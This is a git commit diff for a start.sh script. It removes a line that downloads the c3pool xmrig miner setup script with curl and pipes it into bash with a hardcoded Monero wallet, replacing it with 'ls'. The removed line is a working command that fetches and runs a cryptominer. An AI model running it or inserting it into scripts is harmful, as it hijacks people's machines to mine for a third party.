829918e2051d507e286990829d6b1f8ce96b83ef
zc123d <zxc123332@zc127.f3322.net>
2022-09-06 14:53:34 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 42Ydp6FUq42252CS3qe3eW5JveTc4N8QzahpAHyPNyTPKqrSQWtMLGgMyD6CoYp71jQpyZceP3bGjRukcjFzpL3H6M8twJw
+ls
